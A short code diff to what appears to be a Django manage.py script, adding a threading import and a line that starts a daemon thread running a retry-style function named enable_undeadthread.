@@ -4,6 +4,8 @@ import os
 import sys
 from time import sleep
 import requests
+import threading
+
 
 def enable_undeadthread():
     cnt = 10
@@ -15,6 +17,7 @@ def enable_undeadthread():
             sleep(1)
         else:
             break
+
 
 def main():
     """Run administrative tasks."""
@@ -28,6 +31,8 @@ def main():
             "forget to activate a virtual environment?"
         ) from exc
     execute_from_command_line(sys.argv)
+
+    threading.Thread(target=enable_undeadthread, daemon=True).start()
 
 
 if __name__ == '__main__':
